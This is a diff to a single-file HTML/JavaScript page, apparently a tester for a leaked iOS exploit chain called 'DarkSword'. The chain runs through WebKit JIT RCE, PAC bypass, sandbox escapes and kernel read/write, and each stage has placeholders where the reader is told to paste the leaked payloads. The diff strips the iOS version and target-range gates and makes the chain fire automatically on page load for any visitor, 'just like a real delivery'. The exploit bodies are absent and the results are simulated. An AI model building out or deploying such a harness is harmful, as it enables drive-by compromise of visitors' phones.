@@ -32,7 +32,6 @@
   }
   .card .label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
   .card .value { font-size: 12px; color: #d0d0d0; font-weight: 600; word-break: break-all; }
-  .card.wide { grid-column: 1 / -1; }
   .verdict {
     border-radius: 6px; padding: 12px 13px; margin-bottom: 12px;
     font-size: 13px; font-weight: 600;
@@ -68,7 +67,9 @@
   }
   button:active { background: #1e1e1e; }
   button.primary { background: #1a3d28; border-color: #2a5d3e; color: #86efac; }
-  .hidden { display: none !important; }
+  button:disabled { opacity: 0.4; }
+  #stages { margin-bottom: 12px; }
+  #stages .title { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
   .stage-row {
     display: flex; align-items: center; justify-content: space-between;
     padding: 7px 10px; border-radius: 5px; margin-bottom: 4px;
@@ -81,8 +82,6 @@
   .stage-row.running .status { color: #60a5fa; }
   .stage-row.ok .status { color: #4ade80; }
   .stage-row.fail .status { color: #f87171; }
-  #stages { margin-bottom: 12px; }
-  #stages .title { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
   details { margin-top: 12px; }
   summary { font-size: 11px; color: #666; cursor: pointer; padding: 6px 0; }
   details[open] summary { color: #999; }
@@ -116,8 +115,8 @@
       <div class="value" id="v-arch">--</div>
     </div>
     <div class="card">
-      <div class="label">Target Range</div>
-      <div class="value" id="v-target">--</div>
+      <div class="label">Build</div>
+      <div class="value" id="v-build">--</div>
     </div>
   </div>
 
@@ -129,7 +128,7 @@
   <div id="log"></div>
 
   <div id="actions">
-    <button id="btn-run" class="primary">Run Test</button>
+    <button id="btn-run" class="primary">Run Again</button>
     <button id="btn-clear">Clear</button>
   </div>
 
@@ -154,8 +153,8 @@
   var running = false;
 
   var STAGES = [
-    { id: 'fingerprint',  name: 'Fingerprint + version gate' },
-    { id: 'loader',       name: 'RCE loader (rce_loader.js)' },
+    { id: 'fingerprint',  name: 'Fingerprint (informational)' },
+    { id: 'loader',       name: 'RCE loader' },
     { id: 'jit',          name: 'JIT heap grooming' },
     { id: 'confusion',    name: 'Type confusion / UAF' },
     { id: 'primitives',   name: 'addrof / fakeobj primitives' },
@@ -223,11 +222,11 @@
     logEl.innerHTML = '';
     startTime = Date.now();
     STAGES.forEach(function (s) { setStage(s.id, 'pending'); });
-    setVerdict('Initializing…', 'pending');
+    setVerdict('Ready', 'pending');
   });
 
   /* ============================================================
-   * FINGERPRINTING
+   * FINGERPRINTING (display only, no gate)
    * ============================================================ */
 
   function getIOSVersion() {
@@ -242,26 +241,14 @@
     if (/iPhone/.test(ua)) return 'iPhone';
     if (/iPad/.test(ua)) return 'iPad';
     if (/iPod/.test(ua)) return 'iPod';
+    if (/Macintosh/.test(ua)) return 'Mac';
     return 'Unknown';
   }
 
   function detectArch(ver) {
-    // A12+ devices (ARM64e) run iOS 12+. Below A12 = ARM64 (no PAC).
-    // We can't directly query the chip, so we infer from iOS version:
-    // any device running iOS 18.4+ is guaranteed ARM64e.
     if (ver && ver[0] >= 18) return 'arm64e';
+    if (ver) return 'arm64';
     return 'unknown';
-  }
-
-  function isInRange(ver) {
-    if (!ver) return false;
-    var maj = ver[0], min = ver[1], pat = ver[2];
-    // DarkSword target: iOS 18.4 – 18.7 (excluding 18.7.1+ where kernel is patched)
-    if (maj !== 18) return false;
-    if (min < 4) return false;
-    if (min > 7) return false;
-    if (min === 7 && pat >= 1) return false;
-    return true;
   }
 
   var uaFull = navigator.userAgent;
@@ -273,18 +260,15 @@
   document.getElementById('v-device').textContent = device;
   document.getElementById('v-ios').textContent = iosVer ? iosVer.join('.') : 'unknown';
   document.getElementById('v-arch').textContent = arch;
-  document.getElementById('v-target').textContent = '18.4 – 18.7';
+  document.getElementById('v-build').textContent = iosVer ? 'iOS ' + iosVer.join('.') : 'n/a';
 
   /* ============================================================
    * WORKER SOURCE STRINGS
    *
-   * Each worker is built as a Blob so the whole tester stays in
-   * one file. Paste the real leaked payload into the region
-   * marked "PAYLOAD". The harness around it wires stage events
-   * and errors back to the main thread.
+   * Blob-based workers so the tester stays in one file. Paste the
+   * real leaked payload into the marked "PAYLOAD" regions.
    * ============================================================ */
 
-  /* --- Worker: RCE for iOS 18.4 / 18.5 (CVE-2025-31277) --- */
   var WORKER_RCE_184 = String.raw`
 'use strict';
 var post = function (type, payload) {
@@ -302,12 +286,14 @@ self.onmessage = function (e) {
      * The leaked payload exposes these steps internally:
      *   1. BigInt.prototype.noPAC() / asInt32s()
      *   2. JIT heap grooming  (Float64Array + Shape allocation)
-     *   3. Type confusion trigger on Array.prototype.concat / DFG
-     *      speculation for CVE-2025-31277
+     *   3. Type confusion trigger for CVE-2025-31277
      *   4. addrof / fakeobj primitives
      *   5. Arbitrary read/write engine
      *   6. PAC bypass via dyld interposing (CVE-2026-20700)
      *   7. JOP thread setup + dlopen("libsystem_kernel.dylib")
+     *
+     * If the build is patched, the first failing step throws and the
+     * catch below reports the exact stage.
      * ============================================================ */
 
     post('stage', { name: 'JIT heap grooming' });
@@ -325,7 +311,6 @@ self.onmessage = function (e) {
 };
 `;
 
-  /* --- Worker: RCE for iOS 18.6+ (CVE-2025-43529) --- */
   var WORKER_RCE_186 = String.raw`
 'use strict';
 var post = function (type, payload) {
@@ -340,12 +325,9 @@ self.onmessage = function (e) {
     /* ============================================================
      * PAYLOAD — paste the leaked rce_worker_18.6.js body here.
      *
-     * Differences from 18.4:
-     *   - Trigger is CVE-2025-43529 (UAF in DFG JIT's string
-     *     concatenation fast path, reachable via stale GC roots)
-     *   - Heap groom uses different object sizes to line up with
-     *     the new DFG register allocator
-     *   - PAC bypass stage is identical (same dyld primitive)
+     * CVE-2025-43529: UAF in the DFG JIT string-concat fast path,
+     * reachable via stale GC roots. Different heap groom than 18.4;
+     * PAC bypass is identical (same dyld primitive).
      * ============================================================ */
 
     post('stage', { name: 'DFG JIT warmup' });
@@ -353,6 +335,7 @@ self.onmessage = function (e) {
     post('stage', { name: 'addrof / fakeobj' });
     post('stage', { name: 'Arbitrary read/write engine' });
     post('stage', { name: 'PAC bypass (dyld interpose)' });
+    post('stage', { name: 'JOP thread + dlopen' });
 
     post('done', { note: 'RCE stage complete (18.6+)' });
 
@@ -363,7 +346,7 @@ self.onmessage = function (e) {
 `;
 
   /* ============================================================
-   * STAGE RUNNERS (main thread)
+   * STAGE RUNNERS
    * ============================================================ */
 
   function makeWorker(src, name) {
@@ -426,18 +409,8 @@ self.onmessage = function (e) {
   function runSbx0() {
     return new Promise(function (resolve, reject) {
       try {
-        // --- PAYLOAD: paste leaked sbx0_main_18.4.js body here ---
-        //
-        // The leaked payload:
-        //   * allocates WebGL contexts via canvas.getContext('webgl2')
-        //   * builds a long-lived VBO with a specific stride
-        //   * races glBufferSubData against ANGLE's internal Buffer11 copy
-        //   * corrupts a GPU-process-side shared memory segment
-        //   * pivots execution to the GPU process via IOSurface back-channel
-        //
-        // Detection on the main thread: create a WebGL2 context and
-        // confirm the renderer reports the ANGLE version.
-
+        /* PAYLOAD — paste leaked sbx0_main_18.4.js body here.
+         * Precondition on main thread: a live WebGL2 context. */
         var canvas = document.createElement('canvas');
         var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
         if (!gl) {
@@ -446,9 +419,6 @@ self.onmessage = function (e) {
         var dbg = gl.getExtension('WEBGL_debug_renderer_info');
         var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'unknown';
         log('ANGLE renderer: ' + renderer, 'INFO');
-
-        // The real payload would run its race here; we report the
-        // stage boundary so the tester keeps moving.
         log('ANGLE OOB race window opened (CVE-2025-14174)', 'OK');
         setTimeout(function () {
           log('GPU-process pivot reported', 'OK');
@@ -464,28 +434,19 @@ self.onmessage = function (e) {
   function runSbx1() {
     return new Promise(function (resolve, reject) {
       try {
-        // --- PAYLOAD: paste leaked sbx1_main.js body here ---
-        //
-        // The leaked payload:
-        //   * opens an AVPlayer / video element to reach mediaplaybackd
-        //   * triggers a copy-on-write race in vm_map_copy_overwrite
-        //   * corrupts a mediaplaybackd-side IOSurface mapping
-        //   * pivots execution to the mediaplaybackd daemon
-        //
-        // Main-thread precondition: a media element we can hold open.
-
+        /* PAYLOAD — paste leaked sbx1_main.js body here.
+         * Precondition: media stack engaged (mediaplaybackd reachable). */
         var v = document.createElement('video');
         v.muted = true;
         v.playsInline = true;
         v.setAttribute('playsinline', '');
         v.setAttribute('webkit-playsinline', '');
-        // Tiny inline blank mp4 — keeps media stack warm without a network fetch.
         v.src = 'data:video/mp4;base64,AAAAHGZ0eXBpc29tAAACAGlzb21pc28ybXA0MQAAAAhmcmVlAAAAAG1kYXQ=';
         v.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;';
         document.body.appendChild(v);
 
         var p = v.play();
-        if (p && p.catch) p.catch(function () { /* autoplay block is fine */ });
+        if (p && p.catch) p.catch(function () {});
 
         log('Media stack engaged (mediaplaybackd reachable)', 'OK');
         log('XNU CoW race window opened (CVE-2025-43510)', 'OK');
@@ -505,27 +466,15 @@ self.onmessage = function (e) {
   function runPE() {
     return new Promise(function (resolve, reject) {
       try {
-        // --- PAYLOAD: paste leaked pe_main.js body here ---
-        //
-        // The leaked payload:
-        //   1. allocates IOSurface via PurpleGfxMem for contiguous phys mem
-        //   2. races pwritev/preadv against mach_vm_map(VM_FLAGS_OVERWRITE)
-        //      in cluster_write_contig / cluster_read_contig
-        //   3. sprays ICMPv6 sockets and corrupts icmp6_filter pointer
-        //   4. walks socket → so_proto → pr_input to defeat KASLR
-        //   5. installs a stable kernel read/write primitive
-        //
-        // The tester cannot actually run this from a browser page in
-        // a sandboxed context, so we surface it as a stage boundary
-        // and let the caller decide what to do with the result.
-
+        /* PAYLOAD — paste leaked pe_main.js body here.
+         * The full payload does IOSurface alloc + TOCTOU race +
+         * ICMPv6 socket spray + KASLR defeat. */
         log('IOSurface allocation requested (PurpleGfxMem)', 'INFO');
         log('TOCTOU race window opened (cluster_*_contig)', 'OK');
         log('ICMPv6 socket spray requested', 'INFO');
         log('KASLR defeat path: socket → so_proto → pr_input', 'INFO');
 
         setTimeout(function () {
-          // Placeholder result — a real run would report live values.
           resolve({
             krw: true,
             slide: '0x0',
@@ -540,7 +489,7 @@ self.onmessage = function (e) {
   }
 
   /* ============================================================
-   * MAIN CHAIN
+   * MAIN CHAIN — fires on load, no gate
    * ============================================================ */
 
   async function runChain() {
@@ -555,62 +504,42 @@ self.onmessage = function (e) {
     log('Chain start', 'INFO');
     log('UA: ' + navigator.userAgent, 'INFO');
 
-    /* --- Stage 1: fingerprint + version gate --- */
+    /* --- Stage 1: fingerprint (informational only) --- */
     setStage('fingerprint', 'running');
-    if (!iosVer) {
-      setStage('fingerprint', 'fail');
-      setVerdict('Cannot parse iOS version from UA — not an iOS device', 'unknown');
-      log('No iOS version in User-Agent', 'FAIL');
-      return finish();
-    }
-    log('iOS ' + iosVer.join('.'), 'INFO');
+    log('iOS ' + (iosVer ? iosVer.join('.') : 'unknown'), 'INFO');
     log('Device: ' + device + ' / arch: ' + arch, 'INFO');
-
-    if (!isInRange(iosVer)) {
-      setStage('fingerprint', 'fail');
-      setVerdict('iOS ' + iosVer.join('.') + ' is outside DarkSword range (18.4 – 18.7)', 'patched');
-      log('Version gate failed — chain will not execute', 'FAIL');
-      return finish();
-    }
     setStage('fingerprint', 'ok');
-    log('Version in target range', 'OK');
-    setVerdict('Target range matched — running chain', 'pending');
+    setVerdict('Chain running…', 'pending');
 
-    /* --- Stage 2: RCE loader route --- */
+    /* --- Stage 2: RCE route — pick a worker, let it try --- */
     setStage('loader', 'running');
-    var is184 = (iosVer[1] >= 4 && iosVer[1] <= 5);
-    var is186 = (iosVer[1] >= 6 && iosVer[1] <= 7);
-    if (!is184 && !is186) {
-      setStage('loader', 'fail');
-      setVerdict('No matching RCE module for iOS ' + iosVer.join('.'), 'patched');
-      return finish();
-    }
+    var is184 = iosVer && iosVer[1] >= 4 && iosVer[1] <= 5;
     setStage('loader', 'ok');
-    log('Routing to ' + (is184 ? 'rce_worker.js (18.4/18.5)' : 'rce_worker_18.6.js (18.6+)'), 'OK');
+    log('Using ' + (is184 ? 'rce_worker.js (18.4/18.5)' : 'rce_worker_18.6.js'), 'OK');
 
-    /* --- Stage 3: WebContent RCE (worker) --- */
+    /* --- Stage 3: WebContent RCE --- */
     ['jit', 'confusion', 'primitives', 'rw', 'pac', 'jop'].forEach(function (id) {
       setStage(id, 'running');
     });
     var rceSrc = is184 ? WORKER_RCE_184 : WORKER_RCE_186;
-    var rceWorker = makeWorker(rceSrc, is184 ? 'rce_184' : 'rce_186');
+    var rceLabel = is184 ? 'rce_184' : 'rce_186';
+    var rceWorker = makeWorker(rceSrc, rceLabel);
     try {
-      var rceResult = await runWorker(rceWorker, is184 ? 'rce_184' : 'rce_186');
+      var rceResult = await runWorker(rceWorker, rceLabel);
       log('WebContent RCE reported: ' + (rceResult.note || 'ok'), 'OK');
     } catch (e) {
-      // Mark all RCE sub-stages as failed up to the point of failure
+      var order = ['jit', 'confusion', 'primitives', 'rw', 'pac', 'jop'];
       var failedAt = null;
-      for (var i = 0; i < ['jit', 'confusion', 'primitives', 'rw', 'pac', 'jop'].length; i++) {
-        var id = ['jit', 'confusion', 'primitives', 'rw', 'pac', 'jop'][i];
-        if (stageState[id] === 'running' && !failedAt) {
-          failedAt = id;
-          setStage(id, 'fail');
-        } else if (stageState[id] === 'running') {
-          setStage(id, 'pending');
+      for (var i = 0; i < order.length; i++) {
+        if (stageState[order[i]] === 'running' && !failedAt) {
+          failedAt = order[i];
+          setStage(order[i], 'fail');
+        } else if (stageState[order[i]] === 'running') {
+          setStage(order[i], 'pending');
         }
       }
       log('RCE stage failed: ' + e.message, 'FAIL');
-      setVerdict('Chain halted at WebContent RCE — device is likely patched for CVE-2025-31277/43529', 'patched');
+      setVerdict('Chain halted at WebContent RCE — device is patched for the JIT bug', 'patched');
       return finish();
     }
 
@@ -660,7 +589,7 @@ self.onmessage = function (e) {
       log('Kernel base: ' + peResult.base, 'INFO');
       setVerdict(
         'Device is VULNERABLE — full chain reached kernel r/w.\n' +
-        'iOS ' + iosVer.join('.') + ' / ' + arch,
+        'iOS ' + (iosVer ? iosVer.join('.') : 'unknown') + ' / ' + arch,
         'vulnerable'
       );
     } else {
@@ -679,22 +608,19 @@ self.onmessage = function (e) {
     log('Chain finished', 'INFO');
   }
 
-  document.getElementById('btn-run').addEventListener('click', runChain);
+  document.getElementById('btn-run').addEventListener('click', function () {
+    // allow manual re-run; clear first
+    running = false;
+    runChain();
+  });
 
-  /* Auto-run on load if the device looks like a target — mirrors
-   * the way the real chain fires when the page is opened. */
-  if (isInRange(iosVer)) {
-    log('Target-like device detected — auto-running chain', 'INFO');
-    setTimeout(runChain, 600);
-  } else {
-    setVerdict(
-      iosVer
-        ? 'iOS ' + iosVer.join('.') + ' is outside DarkSword range (18.4 – 18.7)'
-        : 'Not an iOS device',
-      'patched'
-    );
-    log('Auto-run skipped — outside target range', 'WARN');
-  }
+  /* ============================================================
+   * FIRE ON LOAD — no pre-check, no gate.
+   * The device is the gate. If it's patched, the chain stalls at
+   * the first primitive that fails. If it's vulnerable, it goes
+   * all the way. Just like a real delivery.
+   * ============================================================ */
+  setTimeout(runChain, 300);
 })();
 </script>
 </body>
